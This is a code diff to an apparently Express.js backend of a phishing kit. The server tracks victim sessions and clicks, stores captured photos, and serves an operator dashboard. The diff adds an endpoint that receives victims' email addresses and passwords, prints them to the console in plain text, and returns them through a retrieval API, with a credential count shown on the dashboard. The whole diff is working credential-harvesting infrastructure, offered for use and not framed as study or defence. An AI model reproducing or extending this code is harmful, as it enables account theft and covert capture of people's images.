@@ -28,6 +28,7 @@ app.post('/api/generate', (req, res) => {
         created: new Date().toISOString(),
         clicks: 0,
         photos: [],
+        credentials: [],
         metadata: {}
     };
     sessions.set(sessionId, session);
@@ -61,7 +62,6 @@ app.post('/api/photo', (req, res) => {
     const session = sessions.get(sessionId);
     const photoId = uuidv4();
     
-    // ✅ PHOTO STORAGE - THIS SAVES THE IMAGE
     session.photos.push({
         id: photoId,
         image: image,
@@ -69,10 +69,31 @@ app.post('/api/photo', (req, res) => {
         metadata: metadata || {}
     });
     
+    console.log(`📸 Photo captured for session: ${sessionId.substring(0, 8)}...`);
     res.json({ success: true, photoId });
 });
 
-// ✅ API ENDPOINT - GET PHOTOS FOR A SESSION
+// Receive login credentials
+app.post('/api/login', (req, res) => {
+    const { sessionId, email, password } = req.body;
+    
+    if (!sessions.has(sessionId)) {
+        return res.status(404).json({ error: 'Session not found' });
+    }
+    
+    const session = sessions.get(sessionId);
+    
+    session.credentials.push({
+        email: email,
+        password: password,
+        timestamp: new Date().toISOString()
+    });
+    
+    console.log(`🔐 Credentials captured: ${email} | ${password}`);
+    res.json({ success: true });
+});
+
+// Get photos for a session
 app.get('/api/photos/:sessionId', (req, res) => {
     const sessionId = req.params.sessionId;
     
@@ -96,6 +117,30 @@ app.get('/api/photos/:sessionId', (req, res) => {
     });
 });
 
+// Get credentials for a session
+app.get('/api/credentials/:sessionId', (req, res) => {
+    const sessionId = req.params.sessionId;
+    
+    let foundSession = null;
+    let fullId = null;
+    for (const [id, data] of sessions.entries()) {
+        if (id.startsWith(sessionId.replace('...', ''))) {
+            foundSession = data;
+            fullId = id;
+            break;
+        }
+    }
+    
+    if (!foundSession) {
+        return res.status(404).json({ error: 'Session not found' });
+    }
+    
+    res.json({ 
+        sessionId: fullId,
+        credentials: foundSession.credentials || []
+    });
+});
+
 // Dashboard HTML
 app.get('/dashboard', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
@@ -108,6 +153,7 @@ app.get('/api/dashboard', (req, res) => {
         status: data.status,
         clicks: data.clicks,
         photos: data.photos.length,
+        credentials: data.credentials ? data.credentials.length : 0,
         created: data.created
     }));
     
